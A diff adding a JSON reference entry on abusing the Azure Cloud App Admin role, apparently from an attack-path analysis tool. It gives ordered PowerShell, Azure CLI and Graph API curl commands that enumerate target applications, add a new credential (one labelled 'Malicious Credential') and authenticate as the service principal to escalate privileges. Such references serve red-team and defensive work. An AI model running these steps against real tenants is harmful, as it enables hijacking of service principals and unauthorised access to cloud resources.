@@ -1,0 +1,93 @@
+{
+    "AZCloudAppAdmin": {
+        "meaning": "Principals with the Cloud App Admin role can control tenant-resident apps. This allows creating new credentials for applications and authenticating as their service principals to abuse whatever privileges the service principal has.",
+        "common": "",
+        "windows": {
+            "PowerShell_AzureAD": [
+                {
+                    "order": 1,
+                    "command": "Connect-AzureAD",
+                    "description": "Connect to Azure AD using PowerShell"
+                },
+                {
+                    "order": 2,
+                    "command": "Get-AzureADApplication | Where-Object {$_.DisplayName -eq \"TargetApp\"}",
+                    "description": "Identify target application to compromise"
+                },
+                {
+                    "order": 3,
+                    "command": "New-AzureADApplicationKeyCredential -ObjectId $AppObjectId -Value $Base64Key -Usage Verify",
+                    "description": "Create new certificate credential for the target application"
+                },
+                {
+                    "order": 4,
+                    "command": "# Use new credential to authenticate as service principal and abuse its privileges",
+                    "description": "Authenticate as service principal using new credential to escalate privileges"
+                }
+            ],
+            "PowerShell_Az_Module": [
+                {
+                    "order": 1,
+                    "command": "Connect-AzAccount",
+                    "description": "Connect to Azure using Az PowerShell module"
+                },
+                {
+                    "order": 2,
+                    "command": "Get-AzADApplication -DisplayName \"TargetApplication\"",
+                    "description": "Enumerate target applications in the tenant"
+                },
+                {
+                    "order": 3,
+                    "command": "New-AzADAppCredential -ApplicationId $AppId -CertValue $CertValue",
+                    "description": "Add new certificate credential to target application"
+                },
+                {
+                    "order": 4,
+                    "command": "# Authenticate as service principal using new credential",
+                    "description": "Use new credential to impersonate service principal"
+                }
+            ]
+        },
+        "linux": {
+            "Azure_CLI": [
+                {
+                    "order": 1,
+                    "command": "az login",
+                    "description": "Authenticate to Azure using Azure CLI"
+                },
+                {
+                    "order": 2,
+                    "command": "az ad app list --query \"[?displayName=='TargetApp'].{id:appId,objectId:objectId}\"",
+                    "description": "List applications and identify target application"
+                },
+                {
+                    "order": 3,
+                    "command": "az ad app credential reset --id $APP_ID --password $NEW_PASSWORD",
+                    "description": "Reset application credentials to gain control"
+                },
+                {
+                    "order": 4,
+                    "command": "az login --service-principal --username $APP_ID --password $NEW_PASSWORD --tenant $TENANT_ID",
+                    "description": "Authenticate as service principal using new credentials"
+                }
+            ],
+            "Graph_API_REST": [
+                {
+                    "order": 1,
+                    "command": "curl -H \"Authorization: Bearer $ACCESS_TOKEN\" \"https://graph.microsoft.com/v1.0/applications\"",
+                    "description": "Enumerate applications via Microsoft Graph API"
+                },
+                {
+                    "order": 2,
+                    "command": "curl -X POST -H \"Authorization: Bearer $ACCESS_TOKEN\" -H \"Content-Type: application/json\" \"https://graph.microsoft.com/v1.0/applications/$APP_ID/addPassword\" -d '{\"passwordCredential\":{\"displayName\":\"Malicious Credential\"}}'",
+                    "description": "Add new password credential to application via Graph API"
+                },
+                {
+                    "order": 3,
+                    "command": "# Use new credential to obtain access token for service principal",
+                    "description": "Authenticate as service principal using newly created credential"
+                }
+            ]
+        }
+    }
+}
